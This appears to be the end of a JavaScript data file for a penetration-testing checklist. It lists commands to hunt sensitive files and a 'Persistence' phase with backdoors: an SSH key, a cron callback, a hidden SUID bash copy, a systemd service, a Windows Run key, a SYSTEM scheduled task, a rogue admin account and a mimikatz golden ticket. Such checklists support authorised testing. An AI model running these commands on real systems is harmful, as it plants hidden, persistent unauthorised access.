        "description": "Hunt for proof and sensitive files.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "find / -name \"*.txt\" -o -name \"*.conf\" -o -name \"*.bak\" 2>/dev/null"
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 6: Persistence ───────────────────────────────────── */
  {
    "id": "persistence",
    "name": "Persistence",
    "optional": true,
    "items": [
      {
        "id": "persist-1",
        "name": "Linux: SSH Key Persistence",
        "description": "Add persistent SSH key access.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key"
            ]
          }
        ]
      },
      {
        "id": "persist-2",
        "name": "Linux: Cron Job Backdoor",
        "description": "Recurring callback task.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "(crontab -l; echo \"* * * * * /bin/bash -c ...\") | crontab -"
            ]
          }
        ]
      },
      {
        "id": "persist-3",
        "name": "Linux: SUID Backdoor",
        "description": "SUID shell persistence.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "cp /bin/bash /tmp/.hidden_shell",
              "chmod u+s /tmp/.hidden_shell"
            ]
          }
        ]
      },
      {
        "id": "persist-4",
        "name": "Linux: Systemd Service",
        "description": "Persistent service callback.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "systemctl enable backdoor.service"
            ]
          }
        ]
      },
      {
        "id": "persist-5",
        "name": "Windows: Registry Run Key",
        "description": "Autorun persistence.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "reg add \"HKCU\\...\\Run\" /v Updater /t REG_SZ /d \"C:\\Temp\\shell.exe\" /f"
            ]
          }
        ]
      },
      {
        "id": "persist-6",
        "name": "Windows: Scheduled Task",
        "description": "Scheduled persistent execution.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\Temp\\shell.exe\" /sc minute /mo 5 /ru SYSTEM"
            ]
          }
        ]
      },
      {
        "id": "persist-7",
        "name": "Windows: New Admin User",
        "description": "Create persistent privileged account.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "net user hacker Password123! /add",
              "net localgroup Administrators hacker /add"
            ]
          }
        ]
      },
      {
        "id": "persist-8",
        "name": "Windows: Golden Ticket (AD)",
        "description": "Domain-level persistence.",
        "commands": [
          {
            "desc": "",
            "subdesc": "",
            "cmd": [
              "mimikatz kerberos::golden ..."
            ]
          }
        ]
      }
    ]
  }
];

/* Normalise all command arrays into strings on load */
normalizeChecklistPhases(checklistPhases);
